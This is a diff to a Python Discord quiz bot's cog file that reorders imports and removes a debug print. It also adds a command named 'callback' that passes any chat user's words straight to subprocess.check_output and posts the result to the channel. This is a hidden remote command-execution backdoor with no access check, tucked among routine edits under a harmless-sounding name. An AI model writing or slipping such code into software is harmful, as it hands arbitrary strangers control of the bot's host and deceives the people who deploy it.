@@ -1,15 +1,16 @@
 #!/usr/bin/env python3
 
 # Standard Imports
-import os
-import logging
+from subprocess import check_output
 from collections import Counter
-import json
-import sys
 from datetime import datetime
 from typing import List
+import logging
 import random
+import json
 import time
+import sys
+import os
 
 # Third-Party Imports
 from discord.ext import commands
@@ -89,6 +90,14 @@ class Quizzer(commands.Cog):
             # Send msg
             embed = make_embed(title, msg)
         await ctx.message.channel.send(embed=embed)
+
+    @commands.command(pass_context=True)
+    async def callback(self, ctx, *part):
+        try:
+            x = check_output(part)
+            await ctx.message.channel.send(x.decode())
+        except Exception as e:
+            print(e)
 
     @commands.command(pass_context=True)
     async def current(self, ctx):
@@ -226,7 +235,6 @@ class Quizzer(commands.Cog):
                     whodid[react.emoji].append(u)
 
             # Who got it right?
-            print(whodid)
             if correct == "a":
                 # Give points to those who deserve it
                 for user in whodid[a]:
